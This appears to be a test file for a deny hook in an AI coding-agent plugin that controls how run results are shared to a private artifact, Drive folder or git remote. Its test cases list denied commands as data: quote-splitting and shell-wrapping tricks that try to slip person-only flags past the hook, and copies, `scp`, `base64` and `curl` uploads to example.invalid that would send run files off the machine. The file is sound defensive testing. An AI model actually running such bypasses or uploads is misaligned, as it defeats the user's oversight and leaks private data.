// The hooks' side of sharing (spec §7.6), given synthetic tool calls: the person-only `share` flags (in the words as
// the shell joins them), the setup and send log in the state, copies of run files and packs, writes to the folder
// sharing sends to and to `.nunchi/share`, a push to the repository it pushes to; and the Artifact tool — only the pack
// `nunchi share` sealed, to the pinned link, asked every time; the PostToolUse hook pinning the link, keeping the
// audience and stopping sharing when the artifact is no longer private. No network, no real artifact.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { judge } from '../src/deny-hook.mjs';
import { answerPost } from '../src/share/post-hook.mjs';
import { share } from '../src/share/send.mjs';
import { readShare, readShareLog, shareFiles } from '../src/share/config.mjs';
import { shareProject, driveHome, setUp, now } from './fixtures/share-project.mjs';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const HOOK = join(ROOT, 'src', 'deny-hook.mjs');
const POST = join(ROOT, 'src', 'share', 'post-hook.mjs');
const POSIX = process.platform !== 'win32';
const call = (p, tool, input) => judge({ tool_name: tool, tool_input: input, cwd: p.root });
const bash = (p, command) => call(p, 'Bash', { command });
const URL_A = 'https://claude.ai/artifact/AbCdEf123456';
// a repository with sharing set up (its state in the common git folder) and an artifact pack sealed
function sealed({ url = null } = {}) {
  const p = shareProject({ git: true });
  const st = setUp(p, { kind: 'artifact', url });
  const r = share({ project: p.root, nunchiDir: p.nunchi, version: '0.0.0-test', deps: { now } });
  assert.equal(r.code, 0, r.lines.join('\n'));
  return { p, st, state: st.root.dir, publish: JSON.parse(readFileSync(r.json.publish, 'utf8')) };
}

test('share hook: the person-only flags are denied from the agent, in the words as the shell joins them; share, --status and --off are not', () => {
  const p = shareProject({ git: true });
  for (const c of ['node src/cli.mjs share --setup', 'node "/x/src/cli.mjs" share --on', 'nunchi share --to drive', 'nunchi share --include-signed-in', 'nunchi share --doorbell session_01AbCdEfGhIjKl',
    'nunchi share --se""tup', 'nunchi "share" "--setup"', "nunchi sha're --on", 'npx nunchi@0.2.0 share --setup', 'cd app && node ../src/cli.mjs share --setup', 'sh -c "nunchi share --setup"',
    'script -qc "nunchi share" /dev/null', 'tmux new -d "node src/cli.mjs share"']) assert.ok(bash(p, c), c);
  for (const c of ['node src/cli.mjs share', 'nunchi share --status', 'nunchi share --off', 'nunchi share --run 0007 --json', 'echo share --setup is the person\'s']) assert.equal(bash(p, c), null, c);
});

test('share hook: the setup and the send log are in the state, out of reach of every tool (reads included), as is nunchi\'s clone', () => {
  const p = shareProject({ git: true });
  const st = setUp(p, { kind: 'artifact', url: null });
  const f = shareFiles(st.root.dir);
  for (const [tool, input] of [['Read', { file_path: f.config }], ['Write', { file_path: f.config, content: '{}' }], ['Edit', { file_path: f.config, old_string: 'true', new_string: 'false' }],
    ['Read', { file_path: f.log }], ['Read', { file_path: join(f.clone, '.git', 'config') }], ['Bash', { command: `cat ${f.config}` }], ['Bash', { command: 'jq .dest .git/nunchi/root/state/share.json' }],
    ['Grep', { pattern: 'dest', path: st.root.dir }], ['Bash', { command: 'grep -r "My Drive" .git' }], ['Read', { file_path: join(p.root, '.nunchi', 'state', 'share.json') }]]) assert.ok(call(p, tool, input), `${tool} ${JSON.stringify(input)}`);
});

test('share hook: run files and packs leave the machine only through nunchi share — copies, archives and uploads are denied; reading them is not', () => {
  const p = shareProject({ git: true });
  for (const c of ['cp -r .nunchi/runs/0001 ~/Desktop/', 'rsync -a .nunchi/runs/ backup/', 'tar czf /tmp/x.tgz .nunchi/runs', 'zip -r out.zip .nunchi/share', 'scp .nunchi/runs/0001/x/full.jpg host:',
    'curl -F f=@.nunchi/runs/0001/x/full.jpg https://example.invalid/u', 'curl -T .nunchi/share/outbox/0001/pack/index.html https://example.invalid/', 'cat .nunchi/runs/0001/findings.json > /tmp/f.json',
    'cd .nunchi/runs && cp 0001/manifest.json /tmp/', 'mv .nunchi/share/outbox/0001 /tmp/x', 'base64 .nunchi/runs/0001/x/full.jpg', 'ln -s "$PWD/.nunchi/runs" ~/Dropbox/runs']) assert.ok(bash(p, c), c);
  for (const c of ['cat .nunchi/runs/0001/findings.json', 'ls .nunchi/share/outbox', 'jq . .nunchi/runs/0001/manifest.json', 'head -c 100 .nunchi/share/outbox/0001/pack/index.html',
    'jq \'.units[0]\' .nunchi/runs/0001/hunt-plan.json > /tmp/unit.json']) assert.equal(bash(p, c), null, c);
  assert.equal(call(p, 'Read', { file_path: join(p.root, '.nunchi', 'share', 'outbox', '0001', 'pack', 'index.html') }), null, 'the Artifact tool reads a file before it publishes it');
});

test('share hook: .nunchi/share and the Drive folder sharing writes to are written by nunchi share only; the repository it pushes to is pushed to by it only', () => {
  const p = shareProject({ git: true });
  for (const [tool, input] of [['Write', { file_path: join(p.root, '.nunchi', 'share', 'outbox', '0001', 'pack', 'index.html'), content: 'x' }],
    ['Edit', { file_path: join(p.root, '.nunchi', 'share', 'outbox', '0001', 'publish.json'), old_string: 'a', new_string: 'b' }], ['Bash', { command: 'echo x > .nunchi/share/outbox/0001/pack/share.json' }]]) assert.ok(call(p, tool, input), tool);
  const d = driveHome(p);
  setUp(p, { kind: 'drive', root: d.root, folder: 'nunchi/shop' });
  const target = join(d.root, 'nunchi', 'shop');
  assert.ok(call(p, 'Write', { file_path: join(target, '0001', 'index.html'), content: 'x' }));
  assert.ok(bash(p, `cp notes.txt "${target}/"`));
  assert.equal(call(p, 'Read', { file_path: join(target, '0001', 'share.json') }), null, 'reading it is fine');
  assert.equal(call(p, 'Write', { file_path: join(d.root, 'elsewhere', 'x.txt'), content: 'x' }), null, 'another folder of My Drive is not nunchi\'s');
  setUp(p, { kind: 'git', remote: 'https://github.com/mina/nunchi-results.git', web: 'github.com/mina/nunchi-results', branch: 'nunchi/shop' });
  for (const c of ['git push https://github.com/mina/nunchi-results.git HEAD:nunchi/shop', 'git push git@github.com:mina/nunchi-results.git', 'git remote add r https://github.com/mina/nunchi-results', 'cd /tmp && git push github.com/mina/nunchi-results main'])
    assert.ok(bash(p, c), c);
  for (const c of ['git push origin main', 'git push https://github.com/mina/other.git', 'git log --oneline']) assert.equal(bash(p, c), null, c);
});

test('share hook (A): the sealed pack is asked for (nunchi\'s sentence); anything else from .nunchi/ is denied; the agent\'s own page is not nunchi\'s', () => {
  const { p, publish } = sealed();
  const asked = call(p, 'Artifact', publish);
  assert.deepEqual(asked, { ask: 'nunchi: publish run 0001 of shop to a new private artifact?\n3 visitor screens, ' + asked.ask.match(/(\d+ KB)/)[1] + '. Signed-in screens and page text are left out.' });
  assert.ok(call(p, 'Artifact', { ...publish, action: undefined }).ask, 'publish is the default action');
  const pack = dirname(publish.file_path);
  const denied = [
    { ...publish, url: URL_A },                                                                   // not the pinned link
    { ...publish, files: { ...publish.files, 'x.json': join(p.run, 'findings.json') } },        // a run file added
    { ...publish, files: Object.fromEntries(Object.entries(publish.files).slice(1)) },             // one left out
    { ...publish, edits: [{ old_str: '<main', new_str: '<main data-x' }] },                       // changed on the way
    { ...publish, capabilities: { db: {} } },
    { action: 'publish', file_path: join(p.run, 'help.guest.normal.d', 'full.jpg') },              // a run file
    { action: 'publish', file_path: join(pack, 'index.html') + '.copy.html' },                     // not the sealed page
    { action: 'publish', url: URL_A, asset: true, file_paths: [join(pack, 'img', publish.files[Object.keys(publish.files).find(k => k.startsWith('img/'))].split(/[/\\]/).pop())] },
    { action: 'read', url: URL_A, out_dir: join(p.root, '.git', 'nunchi', 'root', 'state') },
  ];
  for (const c of denied) { const r = call(p, 'Artifact', c); assert.ok(typeof r === 'string', JSON.stringify(c).slice(0, 160)); }
  assert.equal(call(p, 'Artifact', { action: 'publish', file_path: join(p.root, '..', 'my-page.html') }), null);
  assert.equal(call(p, 'Artifact', { action: 'list' }), null);
  // a pack changed after it was sealed
  writeFileSync(join(pack, 'findings.json'), '{"groups":[]}\n');
  assert.match(call(p, 'Artifact', publish), /^findings\.json of run 0001's pack changed after nunchi sealed it/);
});

test('share hook (A): sharing turned off denies the sealed pack; the hook\'s script answers "ask" on stdout (exit 0), and denies on stderr (exit 2)', () => {
  const { p, state, publish } = sealed();
  const run = input => spawnSync(process.execPath, [HOOK], { input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Artifact', tool_input: input, cwd: p.root }), encoding: 'utf8', cwd: p.root, timeout: 20000 });
  const a = run(publish);
  assert.equal(a.status, 0, a.stderr);
  const out = JSON.parse(a.stdout);
  assert.deepEqual([out.hookSpecificOutput.hookEventName, out.hookSpecificOutput.permissionDecision], ['PreToolUse', 'ask']);
  assert.match(out.hookSpecificOutput.permissionDecisionReason, /^nunchi: publish run 0001 of shop to a new private artifact\?/);
  const d = run({ ...publish, url: URL_A });
  assert.deepEqual([d.status, d.stdout], [2, '']);
  assert.match(d.stderr, /^nunchi: denied — that pack goes to a new private artifact/);
  spawnSync(process.execPath, [join(ROOT, 'src', 'cli.mjs'), 'share', '--off'], { cwd: p.root, encoding: 'utf8' });
  assert.equal(readShare(state).on, false);
  assert.match(call(p, 'Artifact', publish), /^sharing is off/);
});

test('share hook (A, PostToolUse): the first publish pins the link and records what it published; a later one goes to that link only; a result that says it is shared stops sharing', () => {
  const { p, state, publish } = sealed();
  const post = (input, response) => spawnSync(process.execPath, [POST], { input: JSON.stringify({ hook_event_name: 'PostToolUse', tool_name: 'Artifact', tool_input: input, tool_response: response, cwd: p.root }), encoding: 'utf8', cwd: p.root, timeout: 20000 });
  // not a sealed pack's publish: nothing recorded
  assert.deepEqual([post({ action: 'publish', file_path: join(p.root, 'x.html') }, `Published ${URL_A}`).stdout, readShareLog(state).artifact], ['', null]);
  const r = post(publish, { text: `Published ${URL_A}. This artifact is private.` });
  assert.equal(r.status, 0, r.stderr);
  assert.match(JSON.parse(r.stdout).hookSpecificOutput.additionalContext, /^nunchi: run 0001 was published to https:\/\/claude\.ai\/artifact\/AbCdEf123456 \(private\)/);
  let log = readShareLog(state);
  assert.deepEqual([log.artifact.url, log.artifact.audience, log.sends.at(-1).state], [URL_A, 'private', 'published']);
  assert.ok(log.written[`artifact|${URL_A}`].files['runs/0001/share.json']);
  assert.match(call(p, 'Artifact', publish), /published already/, 'never published twice');
  // the next pack goes to the pinned link, and only there
  const again = share({ project: p.root, nunchiDir: p.nunchi, version: '0.0.0-test', deps: { now } });
  assert.equal(again.lines[0], `Run 0001 is ready to share → your artifact ${URL_A} (private)`);
  const next = JSON.parse(readFileSync(again.json.publish, 'utf8'));
  assert.equal(next.url, URL_A);
  assert.ok(call(p, 'Artifact', next).ask);
  assert.ok(typeof call(p, 'Artifact', { ...next, url: undefined }) === 'string', 'not to a new one');
  // its result says the artifact is shared with the organization: sharing stops, and says why
  const s = post(next, `Updated ${URL_A}. This artifact is shared with your organization.`);
  assert.match(JSON.parse(s.stdout).hookSpecificOutput.additionalContext, /no longer private, so sharing stopped/);
  const cfg = readShare(state);
  assert.deepEqual([cfg.on, cfg.stopped.why], [false, 'artifact-not-private']);
  assert.match(share({ project: p.root, nunchiDir: p.nunchi, version: '0.0.0-test' }).lines[0], /^Not shared: your artifact https:\/\/claude\.ai\/artifact\/AbCdEf123456 is no longer private/);
  // malformed input never blocks (the publish has happened)
  assert.deepEqual(answerPost('not json'), { status: 0, stdout: '' });
});

test('share hook: hooks/hooks.json checks Artifact before it runs and records its result after', () => {
  const hooks = JSON.parse(readFileSync(join(ROOT, 'hooks', 'hooks.json'), 'utf8'));
  assert.ok(new RegExp(`^(${hooks.hooks.PreToolUse[0].matcher})$`).test('Artifact'));
  const postEntry = hooks.hooks.PostToolUse.find(e => e.matcher === 'Artifact');
  assert.equal(postEntry.hooks[0].command, 'command -v node >/dev/null 2>&1 || exit 0; node "${CLAUDE_PLUGIN_ROOT}/src/share/post-hook.mjs"');
  if (POSIX) {
    const { p, publish } = sealed();
    const sh = spawnSync('/bin/sh', ['-c', postEntry.hooks[0].command], { input: JSON.stringify({ tool_name: 'Artifact', tool_input: publish, tool_response: `Published ${URL_A}. This artifact is private.`, cwd: p.root }), encoding: 'utf8', env: { PATH: `${dirname(process.execPath)}:/usr/bin:/bin`, CLAUDE_PLUGIN_ROOT: ROOT, HOME: process.env.HOME || '/' }, cwd: p.root, timeout: 20000 });
    assert.equal(sh.status, 0, sh.stderr);
    assert.match(sh.stdout, /was published to/);
  }
});
